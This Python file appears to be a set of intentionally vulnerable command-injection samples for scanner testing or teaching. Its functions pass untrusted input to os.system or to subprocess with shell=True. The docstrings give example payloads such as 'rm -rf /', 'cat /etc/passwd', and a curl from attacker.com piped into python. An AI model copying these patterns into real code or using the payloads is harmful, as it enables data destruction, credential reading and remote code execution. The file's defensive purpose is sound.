"""
Command Injection Vulnerable Samples

This file demonstrates various command injection attack vectors through
subprocess, os.system, and shell execution with untrusted input.
"""

import subprocess
import os
import sys


def run_ping_to_host(hostname: str):
    """
    VULNERABILITY: Command injection via shell=True with subprocess.Popen
    Line: 14 - Popen with shell=True and untrusted hostname
    Severity: CRITICAL
    
    Impact: Arbitrary command execution on system
    Example attack: hostname = "google.com; rm -rf /"
    
    Fix: Use shell=False and pass arguments as list
    """
    # VULNERABLE: Line 14
    process = subprocess.Popen(
        f"ping -c 1 {hostname}",
        shell=True,
        stdout=subprocess.PIPE
    )
    return process.stdout.read()


def list_files_in_directory(directory: str):
    """
    VULNERABILITY: Command injection via os.system with user input
    Line: 28 - os.system with untrusted directory path
    Severity: CRITICAL
    
    Impact: Arbitrary command execution
    Example attack: directory = "/tmp; cat /etc/passwd"
    
    Fix: Use subprocess with shell=False, or os.listdir() directly
    """
    # VULNERABLE: Line 28
    os.system(f"ls -la {directory}")


def convert_image_format(input_file: str, output_file: str):
    """
    VULNERABILITY: Command injection via Popen with shell=True
    Line: 40 - Untrusted file paths in shell command
    Severity: CRITICAL
    
    Impact: Command execution, file system manipulation
    
    Fix: Use subprocess.run() with shell=False
    """
    # VULNERABLE: Line 40-41
    subprocess.Popen(
        f"convert {input_file} {output_file}",
        shell=True
    )


def execute_user_script(script_name: str):
    """
    VULNERABILITY: Command injection via shell=True
    Line: 52 - Script name from untrusted source
    Severity: CRITICAL
    
    Impact: Arbitrary Python code execution
    Example attack: script_name = "setup.py; curl attacker.com/malware | python"
    
    Fix: Validate script name against whitelist, use shell=False
    """
    # VULNERABLE: Line 52
    result = subprocess.run(
        f"python {script_name}",
        shell=True,
        capture_output=True
    )
    return result.stdout


def grep_in_file(pattern: str, filepath: str):
    """
    VULNERABILITY: Command injection with os.system
    Line: 66 - Untrusted pattern and file path
    Severity: HIGH
    
    Impact: Arbitrary command execution
    
    Fix: Use subprocess.run with shell=False, or use Python's re module
    """
    # VULNERABLE: Line 66
    exit_code = os.system(f"grep -r '{pattern}' {filepath}")
    return exit_code == 0


def kill_process_by_name(process_name: str):
    """
    VULNERABILITY: Command injection with pkill via os.system
    Line: 78 - Untrusted process name
    Severity: HIGH
    
    Impact: Can kill critical processes
    Example attack: process_name = "worker; rm -rf /"
    
    Fix: Use psutil or subprocess.run with shell=False
    """
    # VULNERABLE: Line 78
    os.system(f"pkill -f {process_name}")


def backup_database(db_name: str, backup_path: str):
    """
    VULNERABILITY: Command injection in database backup command
    Line: 91 - Untrusted db_name parameter
    Severity: CRITICAL
    
    Impact: Database compromise, arbitrary command execution
    
    Fix: Validate db_name, use subprocess.run with shell=False
    """
    # VULNERABLE: Line 91
    cmd = f"mysqldump {db_name} > {backup_path}"
    os.system(cmd)


def send_email_with_attachment(recipient: str, subject: str, attachment_path: str):
    """
    VULNERABILITY: Command injection via mail command
    Line: 104 - Untrusted recipient and subject
    Severity: HIGH
    
    Impact: Email header injection, command execution
    
    Fix: Use Python email library, avoid os.system
    """
    # VULNERABLE: Line 104
    os.system(f"mail -s '{subject}' {recipient} < {attachment_path}")


def run_custom_command_with_args(command: str, *args):
    """
    VULNERABILITY: Entire command string from user input
    Line: 117 - shell=True with untrusted command
    Severity: CRITICAL
    
    Impact: Complete system compromise
    
    Fix: Parse command, validate, use subprocess.run with shell=False
    """
    # VULNERABLE: Line 117
    full_command = f"{command} {' '.join(args)}"
    subprocess.call(full_command, shell=True)


def execute_with_dynamic_shell(user_input: str):
    """
    VULNERABILITY: Direct shell execution with user input
    Line: 130 - Arbitrary shell command from user
    Severity: CRITICAL
    
    Impact: Full system compromise
    
    Fix: Never accept arbitrary shell commands from users
    """
    # VULNERABLE: Line 130
    os.system(user_input)


def compress_files(file_pattern: str, output_archive: str):
    """
    VULNERABILITY: Command injection in tar command
    Line: 143 - Untrusted file pattern
    Severity: HIGH
    
    Impact: Arbitrary file access and command execution
    
    Fix: Use Python tarfile module instead of shell
    """
    # VULNERABLE: Line 143
    os.system(f"tar -czf {output_archive} {file_pattern}")
